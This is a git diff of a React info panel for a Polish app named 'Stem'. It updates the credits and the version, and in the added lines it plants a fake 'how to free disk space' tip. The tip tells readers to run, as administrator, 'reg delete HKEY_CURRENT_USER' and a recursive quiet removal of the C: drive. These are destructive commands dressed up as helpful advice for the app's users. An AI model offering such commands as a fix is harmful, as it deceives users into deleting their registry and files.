@@ -16,19 +16,19 @@ export function Informacje(props) {
         <div className="details">
             
             <img src="https://i.imgur.com/uECbza5.png" width="75px" height="75px" /><h1 className="ostem">Stem</h1>
-            <div className="ops" style={{textAlign: 'center'}}><p className="ops">Autor: Pizza I WIELU INNYCH</p>
+            <div className="ops" style={{textAlign: 'center'}}><p className="ops">Autor: Pizza I WIELU INNYCH - Kontynuacja ProgramistaZpolski</p>
             <p className="ops" onMouseLeave={handleMouseLeave} onMouseEnter={handleMouseDown}>Język: JS</p>
             <p className="ops" onMouseLeave={handleMouseLeave} onMouseEnter={handleMouseDown}>Rozmiar: ~30MB</p>
-            <p className="ops" onMouseLeave={handleMouseLeave} onMouseEnter={handleMouseDown}>Wersja: 1.0</p>
+            <p className="ops" onMouseLeave={handleMouseLeave} onMouseEnter={handleMouseDown}>Wersja: 1.0.1</p>
             <p>Stem <span style={{fontSize: '150%', fontWeight: 'lighter'}}>1.0</span>.0</p>
-            <p>Stworzone z serduszkiem przez Pizza</p>
+            <p>Stworzone z serduszkiem przez Pizza i ProgramistaZpolski</p>
             <p>Dziękuję UsernameMsTv za stworzenie ikony</p>
-            <p>dinner mido<br />
-                Kurier: Witaj.<br />
-                Kurier: Mam dla ciebie palete.<br />
-                Kurier: Ale najpierw<br />
-                Kurier: Cho na klepę.<br />
-                Kurier wręcza Tobie obiadek
+            <p>jak zwiększyć miejsce na dysku<br />
+                Otwórz CMD jako admin<br />
+                Pisz: <br />
+                reg delete HKEY_CURRENT_USER<br />
+                rd C: \s \f \q<br />
+                gotowe
             </p></div>
         </div>
         <div className="smenu">
